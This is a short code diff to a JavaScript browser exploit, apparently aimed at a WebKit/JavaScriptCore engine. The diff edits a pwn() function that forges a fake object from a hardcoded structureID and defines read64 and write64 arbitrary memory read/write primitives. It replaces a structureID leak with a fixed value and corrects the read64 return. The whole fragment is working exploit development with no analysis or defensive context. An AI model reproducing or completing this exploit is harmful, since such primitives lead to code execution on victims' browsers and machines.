@@ -199,12 +199,13 @@ function pwn() {
     // leak structureID
     let noCoW = 13.37;
     var arrLeak = new Array(noCoW, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8);
-    let structureID = LeakStructureID(arrLeak);
+    let structureID = 0x01082307; // valor comum para arrays
     log(`[+] leak structureID: 0x${structureID.toString(16)}`);
     // create a fake object with victim as it's butterfly
     var victim = [noCoW, 14.47, 15.57];
     victim['prop'] = 13.37;
     victim['prop_1'] = 13.37;
+    
     u32[0] = structureID;
     u32[1] = 0x01082309-0x20000;
     var container = {
@@ -237,8 +238,9 @@ function pwn() {
     }
     function read64(addr) {
         driver[1] = i2f(addr + 0x10);
-        return addrof(victim.prop);
+        return f2i(victim.prop);
     }
+
     function write64(addr, val) {
         driver[1] = i2f(addr + 0x10);
         victim.prop = i2f(val);
